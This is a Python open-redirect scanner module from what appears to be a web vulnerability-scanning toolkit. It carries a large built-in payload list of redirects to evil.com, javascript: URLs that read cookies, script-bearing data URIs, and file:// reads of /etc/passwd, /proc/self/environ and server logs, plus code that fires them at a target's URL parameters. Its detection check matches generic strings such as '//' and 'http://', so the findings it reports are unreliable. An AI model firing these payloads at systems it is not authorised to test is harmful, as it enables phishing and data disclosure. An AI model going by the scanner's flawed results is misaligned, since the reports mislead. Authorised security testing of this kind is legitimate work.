#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)
from modules.core.http_client import HTTPClient
from modules.core.payload_manager import PayloadManager


class OpenRedirectScanner:
    """
    Advanced Open Redirect Scanner
    Supports: URL parameters, Protocol-relative URLs, Data URIs, JavaScript URLs
    Combined Power: Internal Payloads (200+) + Payload Manager Integration
    """

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.payload_manager = PayloadManager(verbose=verbose)
        self.results = []
        self.payloads_tested = 0
        self.parameters = {}

        # ---------- INTERNAL PAYLOADS (200+ FOR SPEED & INDEPENDENCE) ----------
        self.internal_payloads = self._load_internal_payloads()

        # ---------- PAYLOAD MANAGER PAYLOADS (FOR UPDATES) ----------
        self.manager_payloads = self._load_manager_payloads()

        # ---------- COMBINED PAYLOADS ----------
        self.all_payloads = list(set(self.internal_payloads + self.manager_payloads))

        # ---------- SUCCESS INDICATORS ----------
        self.success_indicators = [
            "evil.com",
            "attacker.com",
            "malicious.com",
            "phishing.com",
            "redirect",
            "302",
            "301",
            "307",
            "308",
            "location:",
            "Location:",
            "Refresh:",
            "refresh:",
            "window.location",
            "window.open",
            "document.location",
            "top.location",
            "parent.location",
            "self.location",
            "location.href",
            "location.replace",
            "location.assign",
            "document.URL",
            "document.URI",
            "document.referrer",
            "http://",
            "https://",
            "//",
            "javascript:",
        ]

        # Parameter patterns to test
        self.redirect_params = [
            "url",
            "redirect",
            "return",
            "next",
            "dest",
            "destination",
            "goto",
            "go",
            "forward",
            "to",
            "link",
            "href",
            "src",
            "path",
            "uri",
            "resource",
            "page",
            "view",
            "action",
            "callback",
            "continue",
            "redir",
            "out",
            "return_to",
            "redirect_uri",
            "redirect_url",
            "redirect_to",
            "redirect_uri",
            "redir_url",
            "redir_to",
            "redir_uri",
            "return_url",
            "return_uri",
            "next_url",
            "next_uri",
            "goto_url",
        ]

    def _load_internal_payloads(self) -> List[str]:
        """Internal payloads (200+ for speed and independence)"""
        payloads = []

        # ----- BASIC EXTERNAL URLs -----
        external = [
            "http://evil.com",
            "https://evil.com",
            "http://attacker.com",
            "https://attacker.com",
            "http://malicious.com",
            "https://malicious.com",
            "http://phishing.com",
            "https://phishing.com",
            "http://evil.com/",
            "https://evil.com/",
            "http://evil.com/path",
            "https://evil.com/path",
            "http://evil.com/path/to/file",
            "https://evil.com/path/to/file",
            "http://evil.com?param=1",
            "https://evil.com?param=1",
            "http://evil.com#fragment",
            "https://evil.com#fragment",
            "http://evil.com:8080",
            "https://evil.com:8443",
            "http://www.evil.com",
            "https://www.evil.com",
            "http://subdomain.evil.com",
            "https://subdomain.evil.com",
        ]
        payloads.extend(external)

        # ----- PROTOCOL-RELATIVE URLs -----
        protocol_relative = [
            "//evil.com",
            "//attacker.com",
            "//malicious.com",
            "//phishing.com",
            "//evil.com/",
            "//evil.com/path",
            "//evil.com?param=1",
            "//evil.com#fragment",
            "//www.evil.com",
            "//subdomain.evil.com",
            "//evil.com:8080",
            "//evil.com:8443",
            "//evil.com/path/to/file",
        ]
        payloads.extend(protocol_relative)

        # ----- DATA URIS -----
        data_uris = [
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "data:text/plain,Hello%20World",
            "data:text/plain;base64,SGVsbG8gV29ybGQ=",
            "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>",
            "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=",
        ]
        payloads.extend(data_uris)

        # ----- JAVASCRIPT URLs -----
        js_urls = [
            "javascript:alert(1)",
            "javascript:alert('XSS')",
            "javascript:alert(document.cookie)",
            "javascript:alert(document.domain)",
            "javascript:alert(1)//",
            "javascript:alert(1);",
            "javascript:location='http://evil.com'",
            "javascript:window.location='http://evil.com'",
            "javascript:document.location='http://evil.com'",
            "javascript:top.location='http://evil.com'",
            "javascript:parent.location='http://evil.com'",
            "javascript:self.location='http://evil.com'",
            "javascript:location.replace('http://evil.com')",
            "javascript:location.assign('http://evil.com')",
            "javascript:location.href='http://evil.com'",
            "javascript:open('http://evil.com')",
            "javascript:window.open('http://evil.com')",
            "javascript:document.write('http://evil.com')",
            "javascript:document.body.innerHTML='http://evil.com'",
            "javascript:alert(1)%0a",
            "javascript:alert(1)%0d",
            "javascript:alert(1)%0a%0d",
        ]
        payloads.extend(js_urls)

        # ----- ENCODED PAYLOADS -----
        encoded = [
            "http%3A%2F%2Fevil.com",
            "https%3A%2F%2Fevil.com",
            "http%3A//evil.com",
            "https%3A//evil.com",
            "%68%74%74%70%3A%2F%2Fevil.com",
            "%68%74%74%70%73%3A%2F%2Fevil.com",
            "http://evil.com%2f",
            "https://evil.com%2f",
            "http://evil.com%3Fparam=1",
            "https://evil.com%3Fparam=1",
            "http://evil.com%23fragment",
            "https://evil.com%23fragment",
            "http://%65%76%69%6c%2e%63%6f%6d",
            "https://%65%76%69%6c%2e%63%6f%6d",
            "http://evil.com%2e",
            "https://evil.com%2e",
            "http://evil.com%2f%2e%2e",
            "https://evil.com%2f%2e%2e",
        ]
        payloads.extend(encoded)

        # ----- DOUBLE ENCODED -----
        double_encoded = [
            "http%253A%252F%252Fevil.com",
            "https%253A%252F%252Fevil.com",
            "http%253A//evil.com",
            "https%253A//evil.com",
            "%2568%2574%2574%2570%253A%252F%252Fevil.com",
            "%2568%2574%2574%2570%2573%253A%252F%252Fevil.com",
        ]
        payloads.extend(double_encoded)

        # ----- URL SCHEMES -----
        schemes = [
            "ftp://evil.com",
            "sftp://evil.com",
            "ssh://evil.com",
            "telnet://evil.com",
            "gopher://evil.com",
            "dict://evil.com",
            "file:///etc/passwd",
            "file:///C:/windows/win.ini",
            "file:///dev/null",
            "file:///dev/zero",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///var/log/apache2/access.log",
            "file:///var/log/apache2/error.log",
            "file:///var/log/nginx/access.log",
            "file:///var/log/nginx/error.log",
            "file:///var/log/mysql/error.log",
            "file:///var/log/auth.log",
            "file:///var/log/syslog",
            "file:///var/log/messages",
            "file:///var/log/dmesg",
            "file:///var/log/boot.log",
            "file:///var/log/kern.log",
            "file:///var/log/faillog",
            "file:///var/log/lastlog",
            "file:///var/log/wtmp",
            "file:///var/log/btmp",
        ]
        payloads.extend(schemes)

        # ----- UNICODE PAYLOADS -----
        unicode = [
            "http://evil.com/",
            "https://evil.com/",
            "http://evil.com/%00",
            "https://evil.com/%00",
            "http://evil.com/%0a",
            "https://evil.com/%0a",
            "http://evil.com/%0d",
            "https://evil.com/%0d",
            "http://evil.com/%20",
            "https://evil.com/%20",
            "http://evil.com/%09",
            "https://evil.com/%09",
        ]
        payloads.extend(unicode)

        # ----- IP ADDRESS PAYLOADS -----
        ip_payloads = [
            "http://127.0.0.1",
            "https://127.0.0.1",
            "http://192.168.1.1",
            "https://192.168.1.1",
            "http://10.0.0.1",
            "https://10.0.0.1",
            "http://172.16.0.1",
            "https://172.16.0.1",
            "http://0.0.0.0",
            "https://0.0.0.0",
            "http://127.0.0.1:8080",
            "https://127.0.0.1:8443",
            "http://127.0.0.1/",
            "https://127.0.0.1/",
            "http://127.0.0.1/path",
            "https://127.0.0.1/path",
            "http://localhost",
            "https://localhost",
            "http://localhost:8080",
            "https://localhost:8443",
            "http://localhost/",
            "https://localhost/",
            "http://localhost/path",
            "https://localhost/path",
        ]
        payloads.extend(ip_payloads)

        # ----- OBFUSCATED PAYLOADS -----
        obfuscated = [
            "http://evil.com@legitimate.com",
            "https://evil.com@legitimate.com",
            "http://evil.com%2e%2e%2flegitimate.com",
            "https://evil.com%2e%2e%2flegitimate.com",
            "http://evil.com%2f%2flegitimate.com",
            "https://evil.com%2f%2flegitimate.com",
            "http://evil.com%3f@legitimate.com",
            "https://evil.com%3f@legitimate.com",
            "http://evil.com%23@legitimate.com",
            "https://evil.com%23@legitimate.com",
            "http://evil.com#@legitimate.com",
            "https://evil.com#@legitimate.com",
            "http://evil.com?@legitimate.com",
            "https://evil.com?@legitimate.com",
            "http://evil.com/../legitimate.com",
            "https://evil.com/../legitimate.com",
            "http://evil.com%2e%2e%2flegitimate.com",
            "https://evil.com%2e%2e%2flegitimate.com",
            "http://evil.com%2f%2e%2e%2flegitimate.com",
            "https://evil.com%2f%2e%2e%2flegitimate.com",
        ]
        payloads.extend(obfuscated)

        return list(set(payloads))

    def _load_manager_payloads(self) -> List[str]:
        """Load payloads from Payload Manager"""
        payloads = []
        tags = [
            "basic",
            "external",
            "protocol_relative",
            "data_uri",
            "javascript",
            "encoded",
            "scheme",
            "ip",
            "obfuscated",
        ]
        for tag in tags:
            results = self.payload_manager.get_payloads(
                "open_redirect", tags=[tag], limit=50
            )
            for p in results:
                if "value" in p:
                    payloads.append(p["value"])
        return list(set(payloads))

    def extract_params(self) -> Dict:
        parsed = urllib.parse.urlparse(self.target)
        if not parsed.query:
            return {}
        return urllib.parse.parse_qs(parsed.query)

    def build_url(self, params: Dict) -> str:
        parsed = urllib.parse.urlparse(self.target)
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def test_redirect(self, param: str, payload: str) -> bool:
        """Test a single Open Redirect payload"""
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)

        # Don't follow redirects to detect them
        resp = self.client.get(test_url)
        if not resp:
            return False

        self.payloads_tested += 1

        # Check for redirect status codes
        if resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get("location", "")
            if location:
                # Check if the redirect points to an external URL
                for indicator in self.success_indicators:
                    if indicator in location.lower():
                        result = {
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "status": resp.status_code,
                            "location": location,
                            "indicator": indicator,
                        }
                        self.results.append(result)
                        log_success(f"Open Redirect found: {test_url} -> {location}")
                        return True

        # Check for JavaScript redirects in the response
        if resp.status_code == 200:
            for indicator in self.success_indicators:
                if indicator in resp.text.lower():
                    if (
                        "window.location" in resp.text
                        or "document.location" in resp.text
                    ):
                        result = {
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "status": resp.status_code,
                            "indicator": indicator,
                            "preview": resp.text[:200].replace("\n", " ").strip(),
                        }
                        self.results.append(result)
                        log_success(f"JavaScript Redirect found: {test_url}")
                        return True

        return False

    def run(self) -> Dict:
        log_info(f"Starting Open Redirect scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning(
                "No GET parameters found. Open Redirect scan works best with parameters like ?url=http://example.com"
            )
            return {
                "target": self.target,
                "scan_type": "open_redirect",
                "total_params": 0,
                "vulnerable_count": 0,
                "vulnerabilities": [],
                "payloads_tested": 0,
            }

        log_info(f"Found {len(params)} parameter(s): {', '.join(params.keys())}")
        log_info(
            f"Testing {len(self.all_payloads)} payloads (Internal: {len(self.internal_payloads)} + Manager: {len(self.manager_payloads)})"
        )

        target_params = []
        for p in params.keys():
            for pattern in self.redirect_params:
                if pattern in p.lower():
                    target_params.append(p)
                    break
        if not target_params:
            target_params = list(params.keys())[:3]

        for param in target_params:
            log_info(f"Testing parameter: {param}")
            shuffled = self.all_payloads.copy()
            random.shuffle(shuffled)
            for payload in shuffled[:100]:  # Limit to 100 per parameter for speed
                if self.test_redirect(param, payload):
                    if self.verbose:
                        log_info("Found vulnerability, continuing to test for more...")

        log_success(
            f"Open Redirect scan completed. Found {len(self.results)} vulnerabilities."
        )
        return {
            "target": self.target,
            "scan_type": "open_redirect",
            "total_params": len(params),
            "total_payloads_tested": min(len(self.all_payloads), 100)
            * len(target_params),
            "payloads_internal": len(self.internal_payloads),
            "payloads_manager": len(self.manager_payloads),
            "vulnerable_count": len(self.results),
            "vulnerabilities": self.results,
        }
